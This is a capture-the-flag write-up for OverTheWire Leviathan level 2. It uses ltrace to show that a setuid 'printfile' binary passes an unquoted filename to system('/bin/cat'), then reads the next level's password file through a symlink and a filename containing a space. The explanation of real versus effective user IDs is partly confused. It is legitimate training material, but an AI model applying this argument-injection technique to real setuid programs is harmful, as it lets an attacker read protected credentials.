This being the first level, we are given the username and password to connect to the instance via ssh.

To connect, `ssh leviathan2@leviathan.labs.overthewire.org -p 2223`.

On being prompted for password, enter **leviathan2**.

After a successful connection, we are presented with a shell.


We are informed that the `Data for the levels can be found in the homedirectories`.

So lets list the files present in the home directory.

```
leviathan2@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

The **printfile** file has the setuid bit set and it is executable.


The setuid bit allows the executable to gain the permissions of the owner instead of the user executing it.


In this case, on running the printfile executable, it will gain permissions of leviathan3.


Lets run `printfile` and see what happens.

```
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
```

It might be too easy, but lets try printing the password from `/etc/leviathan_pass/leviathan3`.

```
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

So it won't be that easy.


I suspect that printfile must be using cat to print the file we pass as argument.

We can use `ltrace` to see what library calls the printfile executable uses.


And we will print the password to the current level, as we have access to that file.

```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                              = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /etc/leviathan_pass/lev"...<leviathan2_password>
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 0
+++ exited (status 0) +++
```

We will also run ltrace on printfile to print leviathan3 password. This is to see how the executable differs in execution.

```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                              = -1
puts("You cant have that file..."You cant have that file...
)                                       = 27
+++ exited (status 1) +++
```

So printfile executable does use `cat` to print the file. But before printing the file it uses `access` to check if it has permissions to read the file.


The `access` function checks permission using the process' real user ID instead of the effective user ID.


Simply put, the real user ID is the one who owns the process, which in this case is leviathan3.


The effective user ID is what the operating system looks at to make a decision on whether or not you are allowed to execute the operation you requested (this does have exceptions). 


So access will get leviathan3's user permissions.

By seeing ltrace outputs, we can confirm that only when access returns 0, the execution will proceed.


The access function has a vulnerability TOCTOU race (Time of Check to Time of Update).

This program, printfile, will call `access` and then it will call `open` (called by the cat binary) to read the file.


In the time between the two calls, the file may change.

A malicious user could substitute a file the user has access to for a symbolic link to something that the user doesn't have access to, between the access and open calls.


Another interesting thing is that when the filename is passed to `cat`, it does not seem to handle spaces in the filename.

Lets confirm this.

We will make a folder in the `/tmp` directory and create a file with spaces in the name.


```
leviathan2@leviathan:~$ mkdir /tmp/<folder_name>
leviathan2@leviathan:~$ touch /tmp/<folder_name>/symlink\ space
leviathan2@leviathan:~$ ltrace ./printfile /tmp/<folder_name>/symlink\ space 
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access("/tmp/<folder_name>/symlink space", 4)                                   = 0
snprintf("/bin/cat /tmp/<folder_name>/symlink spa"..., 511, "/bin/cat %s", "/tmp/<folder_name>/symlink space") = 34
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /tmp/<folder_name>/symlink spa".../bin/cat: /tmp/<folder_name>/symlink: No such file or directory
/bin/cat: space: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 256
+++ exited (status 0) +++
leviathan2@leviathan:~$ 
``` 


Our suspicion has been confirmed. The space in the filename is not handled when passing the filename to `cat`.

We will use this to our advantage.


Lets add a symbolic link to `/etc/leviathan_pass/leviathan3` and name that symbolic link as `symlink`.


```
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/<folder_name>/symlink
leviathan2@leviathan:~$ ls -al /tmp/<folder_name>
total 268
drwxr-sr-x   2 leviathan2 root   4096 Aug 16 09:04 .
drwxrws-wt 214 root       root 266240 Aug 16 09:04 ..
lrwxrwxrwx   1 leviathan2 root     30 Aug 16 09:04 symlink -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Aug 16 09:03 symlink space
```


Now we will pass `symlink space` to `printfile` executable.

The access function will check permissions to read `symlink space`, which it will have as `symlink space` has read permission for everyone.

Then `symlink space` file will be passed to `cat` to read.

But as we know that, spaces in the filename are not handled, `cat` will treat `symlink` and `space` as two different files.

And as symlink is a symbolic link to `/etc/leviathan_pass/leviathan3`, it wil print leviathan3's password.


Lets see this in action.

```
leviathan2@leviathan:~$ ./printfile /tmp/<folder_name>/symlink\ space
<leviathan3_password>
/bin/cat: space: No such file or directory
leviathan2@leviathan:~$ 
```

With this we get the password for the next level.